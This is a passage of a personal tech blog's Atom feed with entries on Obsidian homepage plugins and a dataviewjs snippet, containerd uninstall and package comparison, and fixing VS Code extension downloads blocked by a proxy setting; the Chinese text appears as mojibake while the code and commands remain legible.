    <content type="html"><![CDATA[<h1 id="èƒŒæ™¯"><a href="#èƒŒæ™¯" class="headerlink" title="èƒŒæ™¯"></a>èƒŒæ™¯</h1><p>æƒ³æ‰“é€ ä¸€ä¸ªå¥½çœ‹çš„ä¸»é¡µ</p><h1 id="é…ç½®"><a href="#é…ç½®" class="headerlink" title="é…ç½®"></a>é…ç½®</h1><h2 id="Homepageæ’ä»¶"><a href="#Homepageæ’ä»¶" class="headerlink" title="Homepageæ’ä»¶"></a>Homepageæ’ä»¶</h2><p>æ–°å»ºæ–‡ä»¶homeï¼Œä¿®æ”¹Homepageæ’ä»¶çš„é…ç½®ä¸ºè¯¥æ–‡ä»¶ï¼Œè¿™æ ·å½“æˆ‘ä»¬åœ¨å¯åŠ¨è½¯ä»¶æ—¶ï¼Œå°±é»˜è®¤æ‰“å¼€æˆ‘ä»¬è®¾è®¡å¥½çš„home</p><p><img src="https://cdn.jsdelivr.net/gh/ningan123/PicGo_Images@main/img/20240728001454.png" alt="image.png"></p><h2 id="dataviewæ’ä»¶ï¼šç»Ÿè®¡æœ¬æ–‡æœ¬åº“çš„æ–‡ä»¶ã€æ ‡ç­¾æ•°é‡ã€‚"><a href="#dataviewæ’ä»¶ï¼šç»Ÿè®¡æœ¬æ–‡æœ¬åº“çš„æ–‡ä»¶ã€æ ‡ç­¾æ•°é‡ã€‚" class="headerlink" title="dataviewæ’ä»¶ï¼šç»Ÿè®¡æœ¬æ–‡æœ¬åº“çš„æ–‡ä»¶ã€æ ‡ç­¾æ•°é‡ã€‚"></a>dataviewæ’ä»¶ï¼šç»Ÿè®¡æœ¬æ–‡æœ¬åº“çš„æ–‡ä»¶ã€æ ‡ç­¾æ•°é‡ã€‚</h2><p>å¼€å¯æ’ä»¶çš„ä¸‹è¿°é…ç½®ï¼š</p><p><img src="https://cdn.jsdelivr.net/gh/ningan123/PicGo_Images@main/img/20240728002755.png" alt="image.png"></p><p>å®‰è£… dataview æ’ä»¶åï¼Œç›´æ¥å°†è¿™æ®µ dataviewjs ä»£ç åŒºåŸŸä¸­å¤åˆ¶åˆ°æ–‡ä»¶ä¸­å³å¯ã€‚</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><code class="hljs bash">```dataviewjs<br><span class="hljs-built_in">let</span> ftMd = dv.pages(<span class="hljs-string">&quot;&quot;</span>).file.sort(t =&gt; t.cday)[0]<br><span class="hljs-built_in">let</span> total = parseInt([new Date() - ftMd.ctime] / (60*60*24*1000))<br><span class="hljs-built_in">let</span> totalDays = <span class="hljs-string">&quot; æ‚¨å·²ä½¿ç”¨ *Obsidian* &quot;</span>+total+<span class="hljs-string">&quot; å¤©ï¼Œ&quot;</span><br><span class="hljs-built_in">let</span> nofold = <span class="hljs-string">&#x27;!&quot;misc/templates&quot;&#x27;</span><br><span class="hljs-built_in">let</span> allFile = dv.pages(nofold).file<br><span class="hljs-built_in">let</span> totalMd = <span class="hljs-string">&quot;å…±åˆ›å»º &quot;</span>+<br>allFile.length+<span class="hljs-string">&quot; ç¯‡ç¬”è®°&quot;</span><br><span class="hljs-built_in">let</span> totalTag = allFile.etags.distinct().length+<span class="hljs-string">&quot; ä¸ªæ ‡ç­¾&quot;</span><br><br>dv.paragraph(<br>totalDays+totalMd+<span class="hljs-string">&quot;ã€&quot;</span>+totalTag+<span class="hljs-string">&quot;&quot;</span><br>)<br></code></pre></td></tr></table></figure><p><img src="https://cdn.jsdelivr.net/gh/ningan123/PicGo_Images@main/img/20240728002712.png" alt="image.png"></p><p>å¯æ˜¾ç¤ºå‡ºå¦‚ä¸‹å†…å®¹<br><img src="https://cdn.jsdelivr.net/gh/ningan123/PicGo_Images@main/img/20240728002839.png" alt="image.png"></p><h2 id="Activity-Historyæ’ä»¶ï¼šè·Ÿè¸ªæŒ‡å®šé¡¹ç›®çš„æ´»åŠ¨ï¼ŒGithub-ä¹‹ç±»çš„æ´»åŠ¨æ¿"><a href="#Activity-Historyæ’ä»¶ï¼šè·Ÿè¸ªæŒ‡å®šé¡¹ç›®çš„æ´»åŠ¨ï¼ŒGithub-ä¹‹ç±»çš„æ´»åŠ¨æ¿" class="headerlink" title="Activity Historyæ’ä»¶ï¼šè·Ÿè¸ªæŒ‡å®šé¡¹ç›®çš„æ´»åŠ¨ï¼ŒGithub ä¹‹ç±»çš„æ´»åŠ¨æ¿"></a>Activity Historyæ’ä»¶ï¼šè·Ÿè¸ªæŒ‡å®šé¡¹ç›®çš„æ´»åŠ¨ï¼ŒGithub ä¹‹ç±»çš„æ´»åŠ¨æ¿</h2><p>åœ¨ä»»æ„ä½ æƒ³å±•ç¤ºæ­¤æ´»åŠ¨å†å²çš„åœ°æ–¹ï¼Œæ·»åŠ å¦‚ä¸‹ä»£ç åˆ‡æ¢åˆ°é¢„è§ˆå³å¯çœ‹åˆ°æ•ˆæœã€‚</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs bash">```ActivityHistory<br>/<br></code></pre></td></tr></table></figure><p><img src="https://cdn.jsdelivr.net/gh/ningan123/PicGo_Images@main/img/20240728004651.png" alt="image.png"><br><code>æ³¨æ„ï¼š</code>æ­¤æ’ä»¶ä»…å±•ç¤ºå®‰è£…ä¹‹åçš„æ´»åŠ¨çŠ¶æ€è®°å½•ï¼Œä¹‹å‰çš„å†å²å¹¶ä¸ä¼šå±•ç¤ºã€‚</p><p>å¯æ˜¾ç¤ºå‡ºå¦‚ä¸‹å†…å®¹ï¼š</p><p><img src="https://cdn.jsdelivr.net/gh/ningan123/PicGo_Images@main/img/20240728005419.png" alt="image.png"></p><h2 id="Calendaræ’ä»¶"><a href="#Calendaræ’ä»¶" class="headerlink" title="Calendaræ’ä»¶"></a>Calendaræ’ä»¶</h2><p>å®‰è£…ä¹‹åæ‰“å¼€week number</p><p><img src="https://cdn.jsdelivr.net/gh/ningan123/PicGo_Images@main/img/20240728005622.png" alt="image.png"></p><p>ç‚¹å‡»å³ä¸Šè§’çš„â€œå±•å¼€â€æŒ‰é’®</p><p><img src="https://cdn.jsdelivr.net/gh/ningan123/PicGo_Images@main/img/20240728010003.png" alt="image.png"><br>ç‚¹å‡»â€œæ—¥å†â€å›¾æ ‡å³å¯<br><img src="https://cdn.jsdelivr.net/gh/ningan123/PicGo_Images@main/img/20240728010038.png" alt="image.png"></p>]]></content>
    
    
    
  </entry>
  
  
  
  <entry>
    <title>ã€obsidianç³»åˆ—ã€‘08.obsidianä¸­å¦‚ä½•è®¾ç½®èƒŒæ™¯ï¼Ÿæ’ä»¶ï¼šStyle Settingsï¼ˆBlue Topazä¸»é¢˜ï¼‰</title>
    <link href="/2024/07/27/obsidian/%E3%80%90obsidian%E7%B3%BB%E5%88%97%E3%80%9108.obsidian%E4%B8%AD%E5%A6%82%E4%BD%95%E8%AE%BE%E7%BD%AE%E8%83%8C%E6%99%AF%EF%BC%9F%E6%8F%92%E4%BB%B6%EF%BC%9AStyle%20Settings%EF%BC%88Blue%20Topaz%E4%B8%BB%E9%A2%98%EF%BC%89/"/>
    <url>/2024/07/27/obsidian/%E3%80%90obsidian%E7%B3%BB%E5%88%97%E3%80%9108.obsidian%E4%B8%AD%E5%A6%82%E4%BD%95%E8%AE%BE%E7%BD%AE%E8%83%8C%E6%99%AF%EF%BC%9F%E6%8F%92%E4%BB%B6%EF%BC%9AStyle%20Settings%EF%BC%88Blue%20Topaz%E4%B8%BB%E9%A2%98%EF%BC%89/</url>
    
    <content type="html"><![CDATA[<p>å·¦ä¸‹è§’é€‰æ‹©â€œè®¾ç½®â€-&gt; â€œå¤–è§‚â€-&gt; â€œä¸»é¢˜â€œ-&gt; â€œç®¡ç†â€œ</p><p><img src="https://cdn.jsdelivr.net/gh/ningan123/PicGo_Images@main/img/20240727232513.png" alt="image.png"></p><p>ä¸‹è½½Blue Topazä¸»é¢˜</p><p>æ­é…æ’ä»¶â€œStyle Settingsâ€</p><p>æ•ˆæœå¦‚ä¸‹ï¼š</p><p><img src="https://cdn.jsdelivr.net/gh/ningan123/PicGo_Images@main/img/20240727233500.png" alt="image.png"></p><p>æ–‡ä»¶å¤¹æ˜¾ç¤ºå‡ºäº†ä¸åŒçš„é¢œè‰²ï¼Œå¾ˆå¥½çœ‹~</p>]]></content>
    
    
    <categories>
      
      <category>obsidian</category>
      
    </categories>
    
    
  </entry>
  
  
  
  <entry>
    <title>ã€nasã€‘(202407) vmwareå®‰è£…ç¾¤æ™–ç³»ç»Ÿ</title>
    <link href="/2024/07/12/nas/%E3%80%90nas%E3%80%91(202407)%20vmware%E5%AE%89%E8%A3%85%E7%BE%A4%E6%99%96%E7%B3%BB%E7%BB%9F/"/>
    <url>/2024/07/12/nas/%E3%80%90nas%E3%80%91(202407)%20vmware%E5%AE%89%E8%A3%85%E7%BE%A4%E6%99%96%E7%B3%BB%E7%BB%9F/</url>
    
    <content type="html"><![CDATA[<p><a href="https://blog.csdn.net/weixin_47605925/article/details/132096470">é»‘ç¾¤æ™–æ‰©å±•ï¼ˆæ‰©å®¹ï¼‰ ç¡¬ç›˜</a></p>]]></content>
    
    
    
  </entry>
  
  
  
  <entry>
    <title>ã€containerdã€‘(202407) 02.æ¸…ç†containeræ–‡ä»¶å’Œé…ç½®</title>
    <link href="/2024/07/09/containerd/%E3%80%90containerd%E3%80%91(202407)%2002.%E6%B8%85%E7%90%86container%E6%96%87%E4%BB%B6%E5%92%8C%E9%85%8D%E7%BD%AE/"/>
    <url>/2024/07/09/containerd/%E3%80%90containerd%E3%80%91(202407)%2002.%E6%B8%85%E7%90%86container%E6%96%87%E4%BB%B6%E5%92%8C%E9%85%8D%E7%BD%AE/</url>
    
    <content type="html"><![CDATA[<h1 id="æ¸…ç†containerdæ–‡ä»¶å’Œé…ç½®"><a href="#æ¸…ç†containerdæ–‡ä»¶å’Œé…ç½®" class="headerlink" title="æ¸…ç†containerdæ–‡ä»¶å’Œé…ç½®"></a>æ¸…ç†containerdæ–‡ä»¶å’Œé…ç½®</h1><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br></pre></td><td class="code"><pre><code class="hljs bash"><span class="hljs-comment"># åœæ­¢containerdè¿›ç¨‹</span><br>systemctl stop containerd --now<br><br><span class="hljs-comment"># åˆ é™¤containerdå®‰è£…åŒ…ä¸‹å‘çš„å„ç§äºŒè¿›åˆ¶å’Œé…ç½®</span><br><span class="hljs-built_in">rm</span> -r -f /cri-containerd.DEPRECATED.txt<br><span class="hljs-built_in">rm</span> -r -f /etc/systemd/system/containerd.service<br><span class="hljs-built_in">rm</span> -r -f /etc/cni/net.d/10-containerd-net.conflist<br><span class="hljs-built_in">rm</span> -r -f /etc/crictl.yaml<br><span class="hljs-built_in">rm</span> -r -f /usr/local/sbin/runc<br><span class="hljs-built_in">rm</span> -r -f /usr/local/bin/containerd-shim<br><span class="hljs-built_in">rm</span> -r -f /usr/local/bin/crictl<br><span class="hljs-built_in">rm</span> -r -f /usr/local/bin/containerd-stress<br><span class="hljs-built_in">rm</span> -r -f /usr/local/bin/critest<br><span class="hljs-built_in">rm</span> -r -f /usr/local/bin/ctr<br><span class="hljs-built_in">rm</span> -r -f /usr/local/bin/ctd-decoder<br><span class="hljs-built_in">rm</span> -r -f /usr/local/bin/containerd-shim-runc-v2<br><span class="hljs-built_in">rm</span> -r -f /usr/local/bin/containerd-shim-runc-v1<br><span class="hljs-built_in">rm</span> -r -f /usr/local/bin/containerd<br><span class="hljs-built_in">rm</span> -r -f /opt/cni/bin/<br><span class="hljs-built_in">rm</span> -r -f /opt/cni/bin/tuning<br><span class="hljs-built_in">rm</span> -r -f /opt/cni/bin/firewall<br><span class="hljs-built_in">rm</span> -r -f /opt/cni/bin/loopback<br><span class="hljs-built_in">rm</span> -r -f /opt/cni/bin/macvlan<br><span class="hljs-built_in">rm</span> -r -f /opt/cni/bin/ptp<br><span class="hljs-built_in">rm</span> -r -f /opt/cni/bin/bridge<br><span class="hljs-built_in">rm</span> -r -f /opt/cni/bin/static<br><span class="hljs-built_in">rm</span> -r -f /opt/cni/bin/dhcp<br><span class="hljs-built_in">rm</span> -r -f /opt/cni/bin/dummy<br><span class="hljs-built_in">rm</span> -r -f /opt/cni/bin/sbr<br><span class="hljs-built_in">rm</span> -r -f /opt/cni/bin/vrf<br><span class="hljs-built_in">rm</span> -r -f /opt/cni/bin/host-local<br><span class="hljs-built_in">rm</span> -r -f /opt/cni/bin/bandwidth<br><span class="hljs-built_in">rm</span> -r -f /opt/cni/bin/vlan<br><span class="hljs-built_in">rm</span> -r -f /opt/cni/bin/host-device<br><span class="hljs-built_in">rm</span> -r -f /opt/cni/bin/portmap<br><span class="hljs-built_in">rm</span> -r -f /opt/cni/bin/ipvlan<br><span class="hljs-built_in">rm</span> -r -f /opt/containerd/cluster/version<br><span class="hljs-built_in">rm</span> -r -f /opt/containerd/cluster/gce/configure.sh<br><span class="hljs-built_in">rm</span> -r -f /opt/containerd/cluster/gce/env<br><span class="hljs-built_in">rm</span> -r -f /opt/containerd/cluster/gce/cloud-init/master.yaml<br><span class="hljs-built_in">rm</span> -r -f /opt/containerd/cluster/gce/cloud-init/node.yaml<br><span class="hljs-built_in">rm</span> -r -f /opt/containerd/cluster/gce/cni.template<br><br><span class="hljs-comment"># åˆ é™¤containerdå¯åŠ¨æ—¶çš„é…ç½®æ–‡ä»¶</span><br><span class="hljs-built_in">rm</span> -r -f /etc/containerd/config.toml<br><br><br></code></pre></td></tr></table></figure>]]></content>
    
    
    
  </entry>
  
  
  
  <entry>
    <title>ã€containerdã€‘(202407) 03.æ¯”è¾ƒcontainerdçš„ä¸‰ç§å®‰è£…åŒ…</title>
    <link href="/2024/07/09/containerd/%E3%80%90containerd%E3%80%91(202407)%2003.%E6%AF%94%E8%BE%83containerd%E7%9A%84%E4%B8%89%E7%A7%8D%E5%AE%89%E8%A3%85%E5%8C%85/"/>
    <url>/2024/07/09/containerd/%E3%80%90containerd%E3%80%91(202407)%2003.%E6%AF%94%E8%BE%83containerd%E7%9A%84%E4%B8%89%E7%A7%8D%E5%AE%89%E8%A3%85%E5%8C%85/</url>
    
    <content type="html"><![CDATA[<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br><span class="line">101</span><br><span class="line">102</span><br><span class="line">103</span><br><span class="line">104</span><br><span class="line">105</span><br><span class="line">106</span><br><span class="line">107</span><br><span class="line">108</span><br><span class="line">109</span><br><span class="line">110</span><br><span class="line">111</span><br></pre></td><td class="code"><pre><code class="hljs bash">[root@ubuntu-22 ~]<span class="hljs-comment"># mkdir containerd-pkg</span><br>[root@ubuntu-22 ~]<span class="hljs-comment"># cd containerd-pkg</span><br>[root@ubuntu-22 containerd-pkg]<span class="hljs-comment"># </span><br><br><br><span class="hljs-comment"># 1 ä»…åŒ…å«containerdç›¸å…³äºŒè¿›åˆ¶çš„ç²¾ç®€å®‰è£…åŒ…</span><br>[root@ubuntu-22 containerd-pkg]<span class="hljs-comment"># wget https://github.com/containerd/containerd/releases/download/v1.7.18/containerd-1.7.18-linux-amd64.tar.gz</span><br>[root@ubuntu-22 containerd-pkg]<span class="hljs-comment"># mkdir -p containerd-1.7.18-linux-amd64</span><br>[root@ubuntu-22 containerd-pkg]<span class="hljs-comment"># tar -xvf  containerd-1.7.18-linux-amd64.tar.gz -C containerd-1.7.18-linux-amd64</span><br>bin/<br>bin/containerd-shim<br>bin/containerd-stress<br>bin/ctr<br>bin/containerd-shim-runc-v2<br>bin/containerd-shim-runc-v1<br>bin/containerd<br><br>                                                                                                                                                                                                   <br><span class="hljs-comment"># 2 åŒ…å«containerdã€criä¸runcå·¥å…·çš„å®‰è£…åŒ…</span><br>[root@ubuntu-22 containerd-pkg]<span class="hljs-comment"># wget https://github.com/containerd/containerd/releases/download/v1.7.18/cri-containerd-1.7.18-linux-amd64.tar.gz</span><br>[root@ubuntu-22 containerd-pkg]<span class="hljs-comment"># mkdir -p cri-containerd-1.7.18-linux-amd64</span><br>[root@ubuntu-22 containerd-pkg]<span class="hljs-comment"># tar -xvf cri-containerd-1.7.18-linux-amd64.tar.gz -C cri-containerd-1.7.18-linux-amd64</span><br>cri-containerd.DEPRECATED.txt<br>etc/crictl.yaml<br>etc/systemd/<br>etc/systemd/system/<br>etc/systemd/system/containerd.service<br>usr/<br>usr/local/<br>usr/local/sbin/<br>usr/local/sbin/runc<br>usr/local/bin/<br>usr/local/bin/containerd-shim<br>usr/local/bin/crictl<br>usr/local/bin/containerd-stress<br>usr/local/bin/critest<br>usr/local/bin/ctr<br>usr/local/bin/ctd-decoder<br>usr/local/bin/containerd-shim-runc-v2<br>usr/local/bin/containerd-shim-runc-v1<br>usr/local/bin/containerd<br>opt/containerd/<br>opt/containerd/cluster/<br>opt/containerd/cluster/version<br>opt/containerd/cluster/gce/<br>opt/containerd/cluster/gce/configure.sh<br>opt/containerd/cluster/gce/env<br>opt/containerd/cluster/gce/cloud-init/<br>opt/containerd/cluster/gce/cloud-init/master.yaml<br>opt/containerd/cluster/gce/cloud-init/node.yaml<br>opt/containerd/cluster/gce/cni.template<br><br><br><span class="hljs-comment"># 3 åŒ…å«containerdã€criã€runcã€cniå·¥å…·çš„å®‰è£…åŒ…</span><br>[root@ubuntu-22 containerd-pkg]<span class="hljs-comment"># wget https://github.com/containerd/containerd/releases/download/v1.7.18/cri-containerd-cni-1.7.18-linux-amd64.tar.gz</span><br>[root@ubuntu-22 containerd-pkg]<span class="hljs-comment"># mkdir -p cri-containerd-cni-1.7.18-linux-amd64</span><br>[root@ubuntu-22 containerd-pkg]<span class="hljs-comment"># tar -xvf cri-containerd-cni-1.7.18-linux-amd64.tar.gz -C cri-containerd-cni-1.7.18-linux-amd64</span><br>cri-containerd.DEPRECATED.txt<br>etc/<br>etc/systemd/<br>etc/systemd/system/<br>etc/systemd/system/containerd.service<br>etc/cni/<br>etc/cni/net.d/<br>etc/cni/net.d/10-containerd-net.conflist<br>etc/crictl.yaml<br>usr/<br>usr/local/<br>usr/local/sbin/<br>usr/local/sbin/runc<br>usr/local/bin/<br>usr/local/bin/containerd-shim<br>usr/local/bin/crictl<br>usr/local/bin/containerd-stress<br>usr/local/bin/critest<br>usr/local/bin/ctr<br>usr/local/bin/ctd-decoder<br>usr/local/bin/containerd-shim-runc-v2<br>usr/local/bin/containerd-shim-runc-v1<br>usr/local/bin/containerd<br>opt/<br>opt/cni/<br>opt/cni/bin/<br>opt/cni/bin/tuning<br>opt/cni/bin/firewall<br>opt/cni/bin/loopback<br>opt/cni/bin/macvlan<br>opt/cni/bin/ptp<br>opt/cni/bin/bridge<br>opt/cni/bin/static<br>opt/cni/bin/dhcp<br>opt/cni/bin/dummy<br>opt/cni/bin/sbr<br>opt/cni/bin/vrf<br>opt/cni/bin/host-local<br>opt/cni/bin/bandwidth<br>opt/cni/bin/vlan<br>opt/cni/bin/host-device<br>opt/cni/bin/portmap<br>opt/cni/bin/ipvlan<br>opt/containerd/<br>opt/containerd/cluster/<br>opt/containerd/cluster/version<br>opt/containerd/cluster/gce/<br>opt/containerd/cluster/gce/configure.sh<br>opt/containerd/cluster/gce/env<br>opt/containerd/cluster/gce/cloud-init/<br>opt/containerd/cluster/gce/cloud-init/master.yaml<br>opt/containerd/cluster/gce/cloud-init/node.yaml<br>opt/containerd/cluster/gce/cni.template<br><br></code></pre></td></tr></table></figure>]]></content>
    
    
    
  </entry>
  
  
  
  <entry>
    <title>ã€containerdã€‘(202407) 04.å®‰è£…nerdctl</title>
    <link href="/2024/07/09/containerd/%E3%80%90containerd%E3%80%91(202407)%2004.%E5%AE%89%E8%A3%85nerdctl/"/>
    <url>/2024/07/09/containerd/%E3%80%90containerd%E3%80%91(202407)%2004.%E5%AE%89%E8%A3%85nerdctl/</url>
    
    <content type="html"><![CDATA[]]></content>
    
    
    
  </entry>
  
  
  
  <entry>
    <title>favorites</title>
    <link href="/2024/07/08/books/favorites/"/>
    <url>/2024/07/08/books/favorites/</url>
    
    <content type="html"><![CDATA[<p>20240708<br>ä¸»é¢˜ï¼šç¦»åˆ«<br>å°æ—¶å€™æˆ‘ä»¬è¯ä¸è¾¾æ„ï¼Œé•¿å¤§åæˆ‘ä»¬è¨€ä¸ç”±è¡·ã€‚çœŸæ­£çš„ç¦»åˆ«ï¼Œä¸æ˜¯æ¡ƒèŠ±æ½­æ°´ï¼Œä¸æ˜¯é•¿äº­å¤é“ï¼Œåªä¸è¿‡åœ¨åŒæ ·æ´’æ»¡é˜³å…‰çš„æ—©ä¸Šï¼Œæœ‰çš„äººæ°¸è¿œç•™åœ¨äº†æ˜¨å¤©ã€‚</p>]]></content>
    
    
    
  </entry>
  
  
  
  <entry>
    <title>ã€cygwinã€‘windowsä¸‹å®‰è£…cygwin</title>
    <link href="/2024/06/25/software/%E3%80%90cygwin%E3%80%91windows%E4%B8%8B%E5%AE%89%E8%A3%85cygwin/"/>
    <url>/2024/06/25/software/%E3%80%90cygwin%E3%80%91windows%E4%B8%8B%E5%AE%89%E8%A3%85cygwin/</url>
    
    <content type="html"><![CDATA[<h1 id="å‚è€ƒ"><a href="#å‚è€ƒ" class="headerlink" title="å‚è€ƒ"></a>å‚è€ƒ</h1><p><a href="http://velep.com/archives/747.html">cygwinä»‹ç»ã€å®‰è£…åŠå…¶ä½¿ç”¨ Â» reille blog (velep.com)</a></p>]]></content>
    
    
    
  </entry>
  
  
  
  <entry>
    <title>ã€vscodeã€‘(202406) vscodeæ— æ³•ä¸‹è½½æ’ä»¶</title>
    <link href="/2024/06/25/software/%E3%80%90vscode%E3%80%91(202406)%20vscode%E6%97%A0%E6%B3%95%E4%B8%8B%E8%BD%BD%E6%8F%92%E4%BB%B6/"/>
    <url>/2024/06/25/software/%E3%80%90vscode%E3%80%91(202406)%20vscode%E6%97%A0%E6%B3%95%E4%B8%8B%E8%BD%BD%E6%8F%92%E4%BB%B6/</url>
    
    <content type="html"><![CDATA[<h2 id="é—®é¢˜ä»‹ç»"><a href="#é—®é¢˜ä»‹ç»" class="headerlink" title="é—®é¢˜ä»‹ç»"></a>é—®é¢˜ä»‹ç»</h2><p>error while fetching extensions.xhr failed</p><p><img src="https://raw.githubusercontent.com/ningan123/PicGo_Images/main/img/20240624231417.png" alt="image.png"></p><h2 id="æ’æŸ¥"><a href="#æ’æŸ¥" class="headerlink" title="æ’æŸ¥"></a>æ’æŸ¥</h2><p>open the network tab (F1 &gt; Toggle Developer Tools) and check the network error.</p><p>å‘ç°æ˜¯ä»£ç†é—®é¢˜</p><p><img src="https://raw.githubusercontent.com/ningan123/PicGo_Images/main/img/20240624230755.png" alt="image.png"></p><p>æ‰“å¼€è¿œç¨‹linuxç³»ç»Ÿä¸‹çš„ä¸€ä¸ªç›®å½•ï¼ŒæŸ¥çœ‹Proxyï¼Œæ²¡æœ‰ä¸œè¥¿</p><p><img src="https://raw.githubusercontent.com/ningan123/PicGo_Images/main/img/20240624231124.png" alt="image.png"></p><p>Userä¸‹é¢ä¹Ÿæ²¡æœ‰ä¸œè¥¿<br><img src="https://raw.githubusercontent.com/ningan123/PicGo_Images/main/img/20240624231142.png" alt="image.png"></p><p>æ‰“å¼€ä¸€ä¸ªwindowsç©ºçª—å£ï¼ŒæŸ¥æ‰¾Proxyï¼Œç¡®å®æœ‰ä¸€ä¸ªä»£ç†</p><p><img src="https://raw.githubusercontent.com/ningan123/PicGo_Images/main/img/20240624230924.png" alt="image.png"></p><h2 id="è§£å†³åŠæ³•"><a href="#è§£å†³åŠæ³•" class="headerlink" title="è§£å†³åŠæ³•"></a>è§£å†³åŠæ³•</h2><p>åˆ é™¤æ­¤ä»£ç†ï¼Œè¿”å›æ‰“å¼€è¿œç¨‹linuxä»£ç çš„çª—å£ï¼Œåœ¨æ‰©å±•é‡Œé¢æœç´¢æ’ä»¶ï¼Œä¾‹å¦‚ï¼šGoï¼Œå°±å¯ä»¥åŠ è½½å‡ºæ¥äº†<br>æˆ‘éƒ½æ²¡æœ‰é‡å¯vscodeï¼Œå°±æ­£å¸¸äº†~</p><h1 id="å‚è€ƒ"><a href="#å‚è€ƒ" class="headerlink" title="å‚è€ƒ"></a>å‚è€ƒ</h1><p><a href="https://github.com/microsoft/vscode/issues/202993">error while fetching extensions XHR failed Â· Issue #202993 Â· microsoft&#x2F;vscode (github.com)</a></p>]]></content>
    
    
    <categories>
      
      <category>software</category>
      
    </categories>
    
    
  </entry>
  
  
  
  <entry>
    <title>ã€vscodeã€‘(202406) windowsä¸‹vscodeè¿œç¨‹è¿æ¥linuxè™šæ‹Ÿæœºæ—¶gitæ— æ³•åŠ è½½çš„é—®é¢˜</title>
    <link href="/2024/06/23/software/%E3%80%90vscode%E3%80%91(202406)%20windows%E4%B8%8Bvscode%E8%BF%9C%E7%A8%8B%E8%BF%9E%E6%8E%A5linux%E8%99%9A%E6%8B%9F%E6%9C%BA%E6%97%B6git%E6%97%A0%E6%B3%95%E5%8A%A0%E8%BD%BD%E7%9A%84%E9%97%AE%E9%A2%98/"/>
    <url>/2024/06/23/software/%E3%80%90vscode%E3%80%91(202406)%20windows%E4%B8%8Bvscode%E8%BF%9C%E7%A8%8B%E8%BF%9E%E6%8E%A5linux%E8%99%9A%E6%8B%9F%E6%9C%BA%E6%97%B6git%E6%97%A0%E6%B3%95%E5%8A%A0%E8%BD%BD%E7%9A%84%E9%97%AE%E9%A2%98/</url>
    
